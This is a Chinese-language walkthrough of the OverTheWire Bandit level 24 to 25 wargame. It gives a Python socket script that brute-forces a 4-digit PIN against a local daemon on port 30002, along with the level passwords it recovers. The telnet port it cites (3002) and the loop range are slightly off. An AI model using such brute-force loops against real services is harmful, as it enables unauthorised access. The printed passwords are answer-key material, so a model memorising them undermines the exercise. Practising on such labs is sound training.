25、Level24-Level25

1.题目要求

一个守护进程正在侦听端口 30002，如果给定了 bandit24 的密码和一个秘密的 4 位数字密码，它将为您提供 bandit25 的密码。除了遍历所有 10000 种组合（称为暴力破解）之外，没有其他方法可以检索密码。

2.登录系统

3.测试端口

telnet localhost 3002

4.使用python脚本

import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host, port = 'localhost', 30002
s.connect((host, port))
tmp = s.recv(1024)
for i in range(1000,9999):
    s.send(b'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %04d\n' % i)
    tmp = s.recv(1024)
    if not tmp.startswith(b"Wrong"):
        print(i, tmp)
    elif i % 100 == 0:
        print(i)

5.获取到密码

获取到密码为：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
